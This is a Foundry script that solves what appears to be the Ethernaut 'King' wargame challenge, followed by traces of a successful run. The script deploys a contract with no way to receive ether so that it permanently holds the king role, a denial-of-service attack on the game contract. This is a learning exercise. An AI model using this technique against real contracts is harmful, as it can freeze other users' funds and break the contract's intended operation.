// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TheLastKing {
    constructor(King _kingInstance) payable {
        address(_kingInstance).call{value: _kingInstance.prize()}("");
    }
}
contract KingSolution is Script {

    King public kingInstance = King(payable(0x9418e564798274Fd1b1836d33A567305e859E6a7));
  
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new TheLastKing{value: kingInstance.prize()}(kingInstance); 
        vm.stopBroadcast();
    }
}

/*
Traces:
  [80137] KingSolution::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::startBroadcast(<pk>)
    │   └─ ← [Return]
    ├─ [2317] 0x9418e564798274Fd1b1836d33A567305e859E6a7::prize() [staticcall]
    │   └─ ← [Return] 1000000000000000 [1e15]
    ├─ [35621] → new TheLastKing@0x8CCb1bd432e234D899681826854E14E8ec4628Ff
    │   ├─ [317] 0x9418e564798274Fd1b1836d33A567305e859E6a7::prize() [staticcall]
    │   │   └─ ← [Return] 1000000000000000 [1e15]
    │   ├─ [14895] 0x9418e564798274Fd1b1836d33A567305e859E6a7::fallback{value: 1000000000000000}()
    │   │   ├─ [55] 0x3049C00639E6dfC269ED1451764a046f7aE500c6::fallback{value: 1000000000000000}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Return] 62 bytes of code
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return]
    └─ ← [Stop]


Script ran successfully.

## Setting up 1 EVM.
==========================
Simulated On-chain Traces:

  [40121] → new TheLastKing@0x8CCb1bd432e234D899681826854E14E8ec4628Ff
    ├─ [2317] 0x9418e564798274Fd1b1836d33A567305e859E6a7::prize() [staticcall]
    │   └─ ← [Return] 1000000000000000 [1e15]
    ├─ [14895] 0x9418e564798274Fd1b1836d33A567305e859E6a7::fallback{value: 1000000000000000}()
    │   ├─ [55] 0x3049C00639E6dfC269ED1451764a046f7aE500c6::fallback{value: 1000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    └─ ← [Return] 62 bytes of code */